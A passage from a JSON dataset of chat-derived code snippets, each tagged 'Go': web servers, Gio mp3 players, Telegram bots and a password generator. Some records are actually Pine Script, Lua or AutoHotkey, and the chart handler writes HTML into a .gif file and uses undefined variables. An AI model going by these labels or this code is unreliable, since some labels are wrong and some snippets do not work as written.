    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"github.com/chenjiandongx/go-echarts/v2/charts\"\n\t\"github.com/chenjiandongx/go-echarts/v2/components\"\n\t\"github.com/chenjiandongx/go-echarts/v2/opts\"\n\t\"github.com/go-chi/chi/v5\"\n\t\"image/gif\"\n\t\"net/http\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc main() {\n\trouter := chi.NewRouter()\n\n\trouter.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\thttp.ServeFile(w, r, \"index.html\")\n\t})\n\n\trouter.Post(\"/optimize\", optimizeHandler)\n\n\tfmt.Println(\"Server running at http://localhost:8080\")\n\thttp.ListenAndServe(\":8080\", router)\n}\n\nfunc optimizeHandler(w http.ResponseWriter, r *http.Request) {\n\t// (Parse inputs, run the algorithm, and generate the bestFitnesses slice)\n\n\tpage := components.NewPage()\n\tline := charts.NewLine()\n\tline.SetGlobalOptions(\n\t\tcharts.WithTitleOpts(opts.Title{Title: \"Best Fitness for each generation\", Subtitle: \"\"}),\n\t\tcharts.WithXAxisOpts(opts.Axis{Type: \"category\"}),\n\t\tcharts.WithYAxisOpts(opts.Axis{Type: \"value\"}),\n\t)\n\tline.AddXAxis(generationsSlice).AddYAxis(\"Fitness\", bestFitnesses).\n\t\tSetSeriesOptions(charts.WithLineChartOpts(opts.LineChart{Smooth: true}))\n\n\t_  = os.Remove(\"best_fitness.gif\")\n\tfile, _ := os.Create(\"best_fitness.gif\")\n\tdefer file.Close()\n\trenderGIF(line, file)\n\n\thttp.Redirect(w, r, \"/?success=true&gif_filename=best_fitness.gif\", http.StatusSeeOther)\n}\n\nfunc renderGIF(line *charts.Line, file *os.File) {\n\tline.Render(file)\n}",
    "filename": "d3da4f0a03cf192bb4e7b528222cdbbf_10.go"
  },
  {
    "conversation_hash": "63fabbb83ae1ea8904eb83bb1b2b3f96",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Super Trend Strategy\", shorttitle=\"STS\", overlay=true)\n\n// تنظیمات ورودی\natrLength = input(14, title=\"ATR Length\", type=input.integer)\nmul = input(1, title=\"Multiplier\", type=input.float)\nresolution = input(title=\"Resolution\", type=input.resolution, defval=\"D\")\nexitDays = input(10, title=\"Exit after days\", type=input.integer)\n\n// محاسبه‌ی مقادیر Super Trend\natr = security(syminfo.tickerid, resolution, atr(atrLength))\nup = (high + low) / 2 + mul * atr\ndn = (high + low) / 2 - mul * atr\ntrendUp = nz(trendUp[1], up)\ntrendDown = nz(trendDown[1], dn)\ntrend = change(trendUp > trendDown ? 1 : -1) != 0 ? trendUp > trendDown ? 1 : -1 : nz(trend[1], 1)\n\n// ایجاد سیگنال‌های خرید و فروش\nlongCondition = crossover(close, trendUp) and trend == 1\nif (longCondition)\n    strategy.entry(\"Long\", strategy.long)\nshortCondition = crossunder(close, trendDown) and trend == -1\nif (shortCondition)\n    strategy.entry(\"Short\", strategy.short)\n\n// خروج از موقعیت پس از روزهای مشخص‌شده\nstrategy.exit(\"Exit Long\", \"Long\", loss=atr, qty_percent=100, when=barssince(longCondition) >= exitDays)\nstrategy.exit(\"Exit Short\", \"Short\", loss=atr, qty_percent=100, when=barssince(shortCondition) >= exitDays)\n\n// رسم خطوط Super Trend در نمودار\nplot(strategy.position_size > 0 ? trendUp : na, color=color.green, linewidth=2, style=plot.style_linebr)\nplot(strategy.position_size < 0 ? trendDown : na, color=color.red, linewidth=2, style=plot.style_linebr)",
    "filename": "63fabbb83ae1ea8904eb83bb1b2b3f96_0.go"
  },
  {
    "conversation_hash": "4287c63a7fb165f14838b4019f81a815",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"io\"\n\t\"os\"\n\t\"sync\"\n\t\"gioui.org/app\"\n\t\"gioui.org/io/system\"\n\t\"gioui.org/layout\"\n\t\"gioui.org/op\"\n\t\"gioui.org/unit\"\n\t\"gioui.org/widget\"\n\t\"gioui.org/widget/material\"\n\t\"gioui.org/font/gofont\"\n\n\t\"github.com/tosone/minimp3\"\n\t\"github.com/hajimehoshi/oto\"\n)\n\nfunc main() {\n\tgo func() {\n\t\tw := app.NewWindow(\n\t\t\tapp.Title(\"mp3 reader\"),\n\t\t\tapp.Size(unit.Dp(350), unit.Dp(500)),\n\t\t)\n\n\t\tvar ops op.Ops\n\t\tfor event := range w.Events() {\n\t\t\tswitch event := event.(type) {\n\t\t\tcase system.DestroyEvent:\n\t\t\t\tos.Exit(0)\n\t\t\tcase system.FrameEvent:\n\t\t\t\tevent.Frame(frame(layout.NewContext(&ops, event)))\n\t\t\t}\n\t\t}\n\t}()\n\tapp.Main()\n}\n\ntype (\n\t// C quick alias for Context.\n\tC = layout.Context\n\t// D quick alias for Dimensions.\n\tD = layout.Dimensions\n)\n\nvar (\n\tth       = material.NewTheme(gofont.Collection())\n\ttopLabel = \"mp3 reader\"\n\tplayBtn  = widget.Clickable{}\n\tpauseBtn = widget.Clickable{}\n\tstopBtn  = widget.Clickable{}\n\tplaying  bool\n\tmu       sync.Mutex\n\tplayer   *oto.Player\n\tdec      *minimp3.Decoder\n)\n\n// frame lays out the entire frame and returns the resultant ops buffer.\nfunc frame(gtx C) *op.Ops {\n\n\tlayout.Center.Layout(gtx, func(gtx C) D {\n\n\t\tgtx.Constraints.Max.X = gtx.Dp(unit.Dp(300))\n\t\treturn layout.Flex{Axis: layout.Vertical}.Layout(gtx,\n\t\t\tlayout.Rigid(func(gtx C) D {\n\t\t\t\tlabel := material.H5(th, topLabel)\n\t\t\t\treturn label.Layout(gtx)\n\t\t\t}),\n\t\t\tlayout.Rigid(func(gtx C) D {\n\t\t\t\treturn material.Button(th, &playBtn, \"Play\").Layout(gtx)\n\t\t\t}),\n\t\t\tlayout.Rigid(func(gtx C) D {\n\t\t\t\treturn material.Button(th, &pauseBtn, \"Pause\").Layout(gtx)\n\t\t\t}),\n\t\t\tlayout.Rigid(func(gtx C) D {\n\t\t\t\treturn material.Button(th, &stopBtn, \"Stop\").Layout(gtx)\n\t\t\t}),\n\t\t)\n\t})\n\n\tif playBtn.Clicked() {\n\t\tgo func() {\n\t\t\tmu.Lock()\n\t\t\tif playing {\n\t\t\t\tmu.Unlock()\n\t\t\t\treturn\n\t\t\t}\n\t\t\tplaying = true\n\t\t\tmu.Unlock()\n\n\t\t\tvar err error\n\n\t\t\tvar file *os.File\n\t\t\tif file, err = os.Open(\"demo.mp3\"); err != nil {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tif dec == nil {\n\t\t\t\tif dec, err = minimp3.NewDecoder(file); err != nil {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tstarted := dec.Started()\n\t\t\t\t<-started\n\n\t\t\t\tvar context *oto.Context\n\t\t\t\tif context, err = oto.NewContext(dec.SampleRate, dec.Channels, 2, 1024); err != nil {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tplayer = context.NewPlayer()\n\t\t\t}\n\n\t\t\tfor {\n\t\t\t\tvar data = make([]byte, 1024)\n\t\t\t\t_, err := dec.Read(data)\n\t\t\t\tif err == io.EOF {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tif err != nil {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tplayer.Write(data)\n\n\t\t\t\tmu.Lock()\n\t\t\t\tif !playing {\n\t\t\t\t\tmu.Unlock()\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tmu.Unlock()\n\t\t\t}\n\n\t\t\tmu.Lock()\n\t\t\tplaying = false\n\t\t\tmu.Unlock()\n\t\t}()\n\t}\n\n\tif pauseBtn.Clicked() {\n\t\tmu.Lock()\n\t\tplaying = false\n\t\tmu.Unlock()\n\t}\n\n\tif stopBtn.Clicked() {\n\t\tmu.Lock()\n\t\tplaying = false\n\t\tif player != nil {\n\t\t\tplayer.Close()\n\t\t\tplayer = nil\n\t\t\tdec = nil\n\t\t}\n\t\tmu.Unlock()\n\t}\n\n\treturn gtx.Ops\n}",
    "filename": "4287c63a7fb165f14838b4019f81a815_0.go"
  },
  {
    "conversation_hash": "10c613e9b4441ca65c8cda097bec1f1d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"io\"\n    \"os\"\n    \"sync\"\n    \"gioui.org/app\"\n    \"gioui.org/io/system\"\n    \"gioui.org/layout\"\n    \"gioui.org/op\"\n    \"gioui.org/unit\"\n    \"gioui.org/widget\"\n    \"gioui.org/widget/material\"\n    \"gioui.org/font/gofont\"\n\n    \"github.com/tosone/minimp3\"\n    \"github.com/hajimehoshi/oto\"\n)\n\nfunc main() {\n    go func() {\n        w := app.NewWindow(\n            app.Title(\"mp3 reader\"),\n            app.Size(unit.Dp(350), unit.Dp(500)),\n        )\n\n        var ops op.Ops\n        for event := range w.Events() {\n            switch event := event.(type) {\n            case system.DestroyEvent:\n                os.Exit(0)\n            case system.FrameEvent:\n                event.Frame(frame(layout.NewContext(&ops, event)))\n            }\n        }\n    }()\n    app.Main()\n}\n\ntype (\n    // C quick alias for Context.\n    C = layout.Context\n    // D quick alias for Dimensions.\n    D = layout.Dimensions\n)\n\nvar (\n    th       = material.NewTheme(gofont.Collection())\n    topLabel = \"mp3 reader\"\n    playBtn  = widget.Clickable{}\n    stopBtn  = widget.Clickable{}\n    pauseBtn = widget.Clickable{}\n    playing  bool\n    mu       sync.Mutex\n    player   *oto.Player\n    dec      *minimp3.Decoder\n)\n\n// frame lays out the entire frame and returns the resultant ops buffer.\nfunc frame(gtx C) *op.Ops {\n\n    layout.Center.Layout(gtx, func(gtx C) D {\n\n        gtx.Constraints.Max.X = gtx.Dp(unit.Dp(300))\n        return layout.Flex{Axis: layout.Vertical}.Layout(gtx,\n            layout.Rigid(func(gtx C) D {\n                label := material.H5(th, topLabel)\n                return label.Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &playBtn, \"Play\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &stopBtn, \"Stop\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &pauseBtn, \"Pause\").Layout(gtx)\n            }),\n        )\n    })\n\n    if playBtn.Clicked() {\n        go func() {\n            mu.Lock()\n            if playing {\n                mu.Unlock()\n                return\n            }\n            playing = true\n            mu.Unlock()\n\n            var err error\n\n            var file *os.File\n            if file, err = os.Open(\"demo.mp3\"); err != nil {\n                return\n            }\n\n            if dec == nil {\n                if dec, err = minimp3.NewDecoder(file); err != nil {\n                    return\n                }\n                started := dec.Started()\n                <-started\n\n                var context *oto.Context\n                if context, err = oto.NewContext(dec.SampleRate, dec.Channels, 2, 1024); err != nil {\n                    return\n                }\n                player = context.NewPlayer()\n            }\n\n            for {\n                var data = make([]byte, 1024)\n                _, err := dec.Read(data)\n                if err == io.EOF {\n                    break\n                }\n                if err != nil {\n                    break\n                }\n                player.Write(data)\n\n                mu.Lock()\n                if !playing {\n                    mu.Unlock()\n                    break\n                }\n                mu.Unlock()\n            }\n\n            mu.Lock()\n            playing = false\n            mu.Unlock()\n        }()\n    }\n\n    if stopBtn.Clicked() {\n        mu.Lock()\n        if player != nil {\n            player.Close()\n            player = nil\n        }\n        if dec != nil {\n            dec.Close()\n            dec = nil\n        }\n        playing = false\n        mu.Unlock()\n    }\n\n    if pauseBtn.Clicked() {\n        mu.Lock()\n        playing = false\n        mu.Unlock()\n    }\n\n    return gtx.Ops\n}",
    "filename": "10c613e9b4441ca65c8cda097bec1f1d_0.go"
  },
  {
    "conversation_hash": "10c613e9b4441ca65c8cda097bec1f1d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"io\"\n    \"os\"\n    \"sync\"\n    \"gioui.org/app\"\n    \"gioui.org/io/system\"\n    \"gioui.org/layout\"\n    \"gioui.org/op\"\n    \"gioui.org/unit\"\n    \"gioui.org/widget\"\n    \"gioui.org/widget/material\"\n    \"gioui.org/font/gofont\"\n\n    \"github.com/tosone/minimp3\"\n    \"github.com/hajimehoshi/oto\"\n)\n\nfunc main() {\n    go func() {\n        w := app.NewWindow(\n            app.Title(\"mp3 reader\"),\n            app.Size(unit.Dp(350), unit.Dp(500)),\n        )\n\n        var ops op.Ops\n        for event := range w.Events() {\n            switch event := event.(type) {\n            case system.DestroyEvent:\n                os.Exit(0)\n            case system.FrameEvent:\n                event.Frame(frame(layout.NewContext(&ops, event)))\n            }\n        }\n    }()\n    app.Main()\n}\n\ntype (\n    // C quick alias for Context.\n    C = layout.Context\n    // D quick alias for Dimensions.\n    D = layout.Dimensions\n)\n\nvar (\n    th       = material.NewTheme(gofont.Collection())\n    topLabel = \"mp3 reader\"\n    playBtn  = widget.Clickable{}\n    stopBtn  = widget.Clickable{}\n    pauseBtn = widget.Clickable{}\n    playing  bool\n    mu       sync.Mutex\n    player   *oto.Player\n    dec      *minimp3.Decoder\n)\n\n// frame lays out the entire frame and returns the resultant ops buffer.\nfunc frame(gtx C) *op.Ops {\n\n    layout.Center.Layout(gtx, func(gtx C) D {\n\n        gtx.Constraints.Max.X = gtx.Dp(unit.Dp(300))\n        return layout.Flex{Axis: layout.Vertical}.Layout(gtx,\n            layout.Rigid(func(gtx C) D {\n                label := material.H5(th, topLabel)\n                return label.Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &playBtn, \"Play\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &stopBtn, \"Stop\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &pauseBtn, \"Pause\").Layout(gtx)\n            }),\n        )\n    })\n\n    if playBtn.Clicked() {\n        go func() {\n            mu.Lock()\n            if playing {\n                mu.Unlock()\n                return\n            }\n            playing = true\n            mu.Unlock()\n\n            var err error\n\n            var file *os.File\n            if file, err = os.Open(\"demo.mp3\"); err != nil {\n                return\n            }\n\n            if dec == nil {\n                if dec, err = minimp3.NewDecoder(file); err != nil {\n                    return\n                }\n                started := dec.Started()\n                <-started\n\n                var context *oto.Context\n                if context, err = oto.NewContext(dec.SampleRate, dec.Channels, 2, 1024); err != nil {\n                    return\n                }\n                player = context.NewPlayer()\n            }\n\n            for {\n                var data = make([]byte, 1024)\n                _, err := dec.Read(data)\n                if err == io.EOF {\n                    break\n                }\n                if err != nil {\n                    break\n                }\n                if player != nil {\n                    player.Write(data)\n                }\n\n                mu.Lock()\n                if !playing {\n                    mu.Unlock()\n                    break\n                }\n                mu.Unlock()\n            }\n\n            mu.Lock()\n            playing = false\n            mu.Unlock()\n        }()\n    }\n\n    if stopBtn.Clicked() {\n        mu.Lock()\n        if player != nil {\n            player.Close()\n            player = nil\n        }\n        if dec != nil {\n            dec.Close()\n            dec = nil\n        }\n        playing = false\n        mu.Unlock()\n    }\n\n    if pauseBtn.Clicked() {\n        mu.Lock()\n        playing = false\n        mu.Unlock()\n    }\n\n    return gtx.Ops\n}",
    "filename": "10c613e9b4441ca65c8cda097bec1f1d_1.go"
  },
  {
    "conversation_hash": "2d38003baa9bc517715ccaf745a329e1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"net/http\"\n    \"os\"\n    \"time\"\n\n    \"gioui.org/app\"\n    \"gioui.org/io/system\"\n    \"gioui.org/layout\"\n    \"gioui.org/op\"\n    \"gioui.org/unit\"\n    \"gioui.org/widget\"\n    \"gioui.org/widget/material\"\n\n    \"gioui.org/font/gofont\"\n\n    \"github.com/hajimehoshi/go-mp3\"\n    \"github.com/hajimehoshi/oto/v2\"\n)\n\nfunc main() {\n    go func() {\n        w := app.NewWindow(\n            app.Title(\"mp3 reader\"),\n            app.Size(unit.Dp(350), unit.Dp(500)),\n        )\n\n        var ops op.Ops\n        for event := range w.Events() {\n            switch event := event.(type) {\n            case system.DestroyEvent:\n                os.Exit(0)\n            case system.FrameEvent:\n                event.Frame(frame(layout.NewContext(&ops, event)))\n            }\n        }\n    }()\n    app.Main()\n}\n\ntype (\n    // C quick alias for Context.\n    C = layout.Context\n    // D quick alias for Dimensions.\n    D = layout.Dimensions\n)\n\nvar (\n    th        = material.NewTheme(gofont.Collection())\n    topLabel  = \"mp3 reader\"\n    playBtn   = widget.Clickable{}\n    pauseBtn  = widget.Clickable{}\n    stopBtn   = widget.Clickable{}\n    url       = \"https://qurango.net/radio/ahmad_khader_altarabulsi\"\n    player    *oto.Player\n    decoding  bool\n    playing   bool\n)\n\n// frame lays out the entire frame and returns the resultant ops buffer.\nfunc frame(gtx C) *op.Ops {\n\n    layout.Center.Layout(gtx, func(gtx C) D {\n\n        gtx.Constraints.Max.X = gtx.Dp(unit.Dp(300))\n        return layout.Flex{Axis: layout.Vertical}.Layout(gtx,\n            layout.Rigid(func(gtx C) D {\n                label := material.H5(th, topLabel)\n                return label.Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &playBtn, \"Play\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &pauseBtn, \"Pause\").Layout(gtx)\n            }),\n            layout.Rigid(func(gtx C) D {\n                return material.Button(th, &stopBtn, \"Stop\").Layout(gtx)\n            }),\n        )\n    })\n\n    if playBtn.Clicked() && !playing && !decoding {\n        go func() {\n            decoding = true        \n            var stream *mp3.Decoder\n            var err error\n            var response *http.Response\n            if response, err = http.Get(url); err != nil {\n                log.Fatal(err)\n            }\n            defer response.Body.Close()\n            if stream, err = mp3.NewDecoder(response.Body); err != nil {\n                log.Fatal(err)\n            }\n            defer stream.Close()\n            context, err := oto.NewContext(stream.SampleRate(), 2, 2, 8192)        \n            if err != nil {\n                log.Fatal(err)\n            }\n            player = context.NewPlayer()\n            defer func() {\n                if player != nil {\n                    player.Close()\n                }\n            }()\n            if _, err = stream.Seek(0, 0); err != nil {\n                log.Fatal(err)\n            }\n            if _, err = player.Write(stream); err != nil {\n                log.Fatal(err)\n            }\n            playing = true\n            decoding = false\n        }()\n    }\n    if pauseBtn.Clicked() && playing {\n        player.Pause()\n        playing = false\n    }\n    if stopBtn.Clicked() && playing {\n        player.Close()\n        playing = false\n    }\n    return gtx.Ops\n}",
    "filename": "2d38003baa9bc517715ccaf745a329e1_0.go"
  },
  {
    "conversation_hash": "d5a39f27efd61101b551d00fbc8de4a3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/gofiber/fiber/v2\"\n\t\"github.com/spf13/viper\"\n)\n\nfunc main() {\n\tapp := fiber.New()\n\n\t// Load configuration\n\tviper.SetConfigFile(\"config.json\")\n\terr := viper.ReadInConfig()\n\tif err != nil {\n\t\tlog.Fatalf(\"Error loading config: %v\\n\", err)\n\t}\n\n\t// Define routers\n\tprotect := app.Group(\"/protect\")\n\tverify := app.Group(\"/verify\")\n\n\t// Handlers for routers\n\tprotect.Get(\"/\", func(c *fiber.Ctx) error {\n\t\treturn c.SendString(\"Protected content\")\n\t})\n\n\tverify.Get(\"/\", func(c *fiber.Ctx) error {\n\t\treturn c.SendString(\"Verification page\")\n\t})\n\n\t// Start server\n\tport := viper.GetInt(\"port\")\n\tif port == 0 {\n\t\tport = 8000 // default port\n\t}\n\n\taddr := fmt.Sprintf(\":%d\", port)\n\terr = app.Listen(addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"Error starting server: %v\\n\", err)\n\t}\n}",
    "filename": "d5a39f27efd61101b551d00fbc8de4a3_0.go"
  },
  {
    "conversation_hash": "d5a39f27efd61101b551d00fbc8de4a3",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"github.com/gofiber/fiber/v2\"\n)\n\nfunc main() {\n\tapp := fiber.New()\n\n\t// Define routers\n\tprotect := app.Group(\"/protect\")\n\tverify := app.Group(\"/verify\")\n\n\t// Handlers for routers\n\tprotect.Get(\"/\", protectHandler)\n\tverify.Get(\"/\", verifyHandler)\n\n\t// Start server\n\tapp.Listen(\":8000\")\n}\n\nfunc protectHandler(c *fiber.Ctx) error {\n\treturn c.SendString(\"Protected content\")\n}\n\nfunc verifyHandler(c *fiber.Ctx) error {\n\treturn c.SendString(\"Verification page\")\n}",
    "filename": "d5a39f27efd61101b551d00fbc8de4a3_4.go"
  },
  {
    "conversation_hash": "d5a39f27efd61101b551d00fbc8de4a3",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\t\"github.com/spf13/viper\"\n)\n\nfunc main() {\n\t// Set default values\n\tviper.SetDefault(\"port\", 8000)\n\tviper.SetDefault(\"database.username\", \"root\")\n\tviper.SetDefault(\"database.password\", \"\")\n\tviper.SetDefault(\"database.host\", \"localhost\")\n\tviper.SetDefault(\"database.port\", 3306)\n\tviper.SetDefault(\"database.name\", \"mydatabase\")\n\n\t// Write example config file\n\tviper.SetConfigType(\"json\")\n\terr := viper.WriteConfigAs(\"example_config.json\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Error writing config: %v\\n\", err)\n\t}\n}",
    "filename": "d5a39f27efd61101b551d00fbc8de4a3_5.go"
  },
  {
    "conversation_hash": "d5a39f27efd61101b551d00fbc8de4a3",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func protectHandler(c *fiber.Ctx) error {\n\ttype RequestBody struct {\n\t\tFilePath string `json:\"file_path\"`\n\t}\n\n\tvar requestBody RequestBody\n\terr := c.BodyParser(&requestBody)\n\tif err != nil {\n\t\treturn c.Status(fiber.StatusBadRequest).JSON(fiber.Map{\n\t\t\t\"message\": \"Invalid request\",\n\t\t})\n\t}\n\n\t// Process file path\n\tfilePath := requestBody.FilePath\n\t// TODO: Implement file path processing logic here\n\n\treturn c.JSON(fiber.Map{\n\t\t\"message\": \"File path processed successfully\",\n\t\t\"file_path\": filePath,\n\t})\n}",
    "filename": "d5a39f27efd61101b551d00fbc8de4a3_7.go"
  },
  {
    "conversation_hash": "d5a39f27efd61101b551d00fbc8de4a3",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tpassword := generateRandomPassword(8)\n\tfmt.Println(password)\n}\n\nfunc generateRandomPassword(length int) string {\n\trandomBytes := make([]byte, length)\n\trand.Read(randomBytes)\n\treturn base64.StdEncoding.EncodeToString(randomBytes)\n}",
    "filename": "d5a39f27efd61101b551d00fbc8de4a3_8.go"
  },
  {
    "conversation_hash": "e216ecddba093a04e5359bedb35e4575",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\nfunc main() {\n\tbot, err := tgbotapi.NewBotAPI(\"YOUR-BOT-TOKEN\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tbot.Debug = true\n\n\tlog.Printf(\"Authorized on account %s\", bot.Self.UserName)\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\n\tfor update := range updates {\n\t\tif update.Message == nil { // ignore non-Message Updates\n\t\t\tcontinue\n\t\t}\n\n\t\tlog.Printf(\"[%s] %s\", update.Message.From.UserName, update.Message.Text)\n\n\t\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\n\t\tmsg.ReplyToMessageID = update.Message.MessageID\n\n\t\tbot.Send(msg)\n\t}\n}",
    "filename": "e216ecddba093a04e5359bedb35e4575_0.go"
  },
  {
    "conversation_hash": "e216ecddba093a04e5359bedb35e4575",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n\n    \"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\nfunc main() {\n    bot, err := tgbotapi.NewBotAPI(\"ВАШ-ТОКЕН-БОТА\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    bot.Debug = true\n\n    log.Printf(\"Authorized on account %s\", bot.Self.UserName)\n\n    u := tgbotapi.NewUpdate(0)\n    u.Timeout = 60\n\n    updates, err := bot.GetUpdatesChan(u)\n\n    for update := range updates {\n        if update.Message == nil { // игнорировать обновления, не являющиеся сообщениями\n            continue\n        }\n\n        log.Printf(\"[%s] %s\", update.Message.From.UserName, update.Message.Text)\n\n        msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)\n        msg.ReplyToMessageID = update.Message.MessageID\n\n        bot.Send(msg)\n    }\n}",
    "filename": "e216ecddba093a04e5359bedb35e4575_1.go"
  },
  {
    "conversation_hash": "e216ecddba093a04e5359bedb35e4575",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\nfunc main() {\n\tbot, err := tgbotapi.NewBotAPI(\"ВАШ-ТОКЕН-БОТА\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tbot.Debug = true\n\n\tlog.Printf(\"Authorized on account %s\", bot.Self.UserName)\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\n\tfor update := range updates {\n\t\tif update.Message == nil { // игнорировать обновления, не являющиеся сообщениями\n\t\t\tcontinue\n\t\t}\n\n\t\tlog.Printf(\"[%s] %s\", update.Message.From.UserName, update.Message.Text)\n\n\t\tif update.Message.IsCommand() { // обработать команды\n\t\t\tswitch update.Message.Command() {\n\t\t\tcase \"menu\":\n\t\t\t\t// создать новое сообщение с inline-клавиатурой\n\t\t\t\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, \"Выберите категорию:\")\n\t\t\t\tmsg.ReplyMarkup = tgbotapi.NewInlineKeyboardMarkup(\n\t\t\t\t\t// создать две кнопки - \"Кнопка 1\" и \"Кнопка 2\"\n\t\t\t\t\ttgbotapi.NewInlineKeyboardRow(\n\t\t\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Кнопка 1\", \"1\"),\n\t\t\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Кнопка 2\", \"2\"),\n\t\t\t\t\t),\n\t\t\t\t)\n\t\t\t\tbot.Send(msg)\n\t\t\t}\n\t\t}\n\t}\n}",
    "filename": "e216ecddba093a04e5359bedb35e4575_2.go"
  },
  {
    "conversation_hash": "66774d380964405441168f5531afc3af",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\nfunc main() {\n\tbot, err := tgbotapi.NewBotAPI(\"<your_bot_api_token>\")\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\n\tbot.Debug = false\n\tlog.Printf(\"Authorized on account %s\", bot.Self.UserName)\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\tupdates, err := bot.GetUpdatesChan(u)\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\n\tfor update := range updates {\n\t\tif update.Message == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tlog.Printf(\"[%s] %s\", update.Message.From.UserName, update.Message.Text)\n\t\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, \"Hello, I am your bot!\")\n\n\t\tif _, err := bot.Send(msg); err != nil {\n\t\t\tlog.Panic(err)\n\t\t}\n\t}\n}",
    "filename": "66774d380964405441168f5531afc3af_1.go"
  },
  {
    "conversation_hash": "863bab5abf89185ccf593263290bd989",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "server_scripts {\n    \"sv_volleyball.lua\"\n}\n\nclient_scripts {\n    \"cl_volleyball.lua\"\n}",
    "filename": "863bab5abf89185ccf593263290bd989_2.go"
  },
  {
    "conversation_hash": "c60517ad71cbc7b6705e68eb0b1290b6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nvar v int = 10\n\nfunc main() {\n    // 在此处使用 v\n}",
    "filename": "c60517ad71cbc7b6705e68eb0b1290b6_1.go"
  },
  {
    "conversation_hash": "3410aeacd29d21a03c960dcac642abad",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    // Original string\n    str := \"The quick brown fox jumps over the lazy dog\"\n\n    // Replace all spaces with underscore\n    str = strings.ReplaceAll(str, \" \", \"_\")\n\n    // Print the modified string\n    fmt.Println(str)\n}",
    "filename": "3410aeacd29d21a03c960dcac642abad_1.go"
  },
  {
    "conversation_hash": "565e775cde29b845312a4e573b8db134",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "#Requires AutoHotkey v2.0\nReq := Request(\"https://www.qobuz.com/us-en/search?q=grrexh0cewaeb\")\nMsgBox(req.getAllResponseHeaders())\nreturn\n\nRequest(url) {\n    WebRequest := ComObjCreate(\"WinHttp.WinHttpRequest.5.1\")\n    WebRequest.Option(6).Set(False) ; No redirects\n    WebRequest.Open(\"GET\", url, false)\n    WebRequest.Send()\n    Return WebRequest\n}",
    "filename": "565e775cde29b845312a4e573b8db134_0.go"
  },
  {
    "conversation_hash": "565e775cde29b845312a4e573b8db134",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
